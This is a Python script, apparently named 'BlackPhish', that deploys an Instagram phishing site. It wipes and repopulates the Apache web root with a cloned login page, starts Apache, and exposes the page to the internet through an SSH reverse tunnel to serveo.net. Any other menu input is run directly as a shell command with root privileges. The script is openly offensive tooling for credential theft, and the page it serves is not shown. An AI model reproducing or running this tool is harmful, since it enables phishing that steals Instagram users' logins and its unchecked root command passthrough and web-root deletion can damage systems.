#!/usr/bin/python3

# version 1.8: - Updated bash commad - added bash execution func - added clean function

# Please update version number each time we update

try:
    import os

except ImportError():
    print("\033[31;1m" + "[!] Error importing")
    exit(1)

 # Variables #

cwd = os.getcwd()

# COLORS #

red = "\033[31;1m"

reset = "\033[0m"

green = "\033[32;1m"

cyan = "\033[36;1m"

yellow = "\033[33;1m"

magenta = "\033[35;1m"

blue = "\033[34;1m"

white = "\033[37;1m"



if os.geteuid() != 0:
    exit(red + "[!] Please run as root" + reset)

def serveo_forward(): # Port forward to serveo#
    os.system('nohup ssh -R inc0gnit0:80:localhost:80 serveo.net &')
    #subprocess.Popen(["rm","-r","some.file"])
    

def main():  # Main script #

    choice = input(cyan+"[BlackPhish] -> ") # Get user input #

    if choice == "1":
        print(green + '[+] Copying Files')
        print(green + '[+] Cleaning /var/www/html/ First')
        os.system('rm -r /var/www/html/ && mkdir /var/www/html/')
        os.system('cp '+'-r '+ cwd  + '/InstagramPhishingSite-Main/' " /var/www/html/")
        print(green + '[+] Starting Apache2 Service')
        os.system('service apache2 start')
        serveo_forward()
        print(green + '[+] Forwarding Traffic to \"https://inc0gnit0.serveo.net/\"')
        print(green + '[+] Done')
        main()

    elif choice == "help":
        print('')

    elif choice == "clear":
        os.system('clear')
        main()
    elif choice == "clean":
        print(green + '[+] Stopping Apache2 Service')
        os.system('service apache2 stop')
        print(green + '[+] Stopping Traffic forwarding to serveo')
        os.system('pkill -f inc0gnit0:80:localhost:80')
        print(green + '[+] Cleaning /var/www/html/')
        os.system('rm -r /var/www/html/ && mkdir /var/www/html')
        print(green + '[+] Done')
        main()

    
    elif choice != "":
        os.system(""+choice)
        main()
    

    else:
        print(red + "[!] Invalid option" + reset)
        main()


try: # This will start the script
    if __name__ == '__main__':
        main()

except KeyboardInterrupt: # Will detect if they exit #
    print("\n")
    print(red + "[!] Exiting" + reset)
    exit(0)
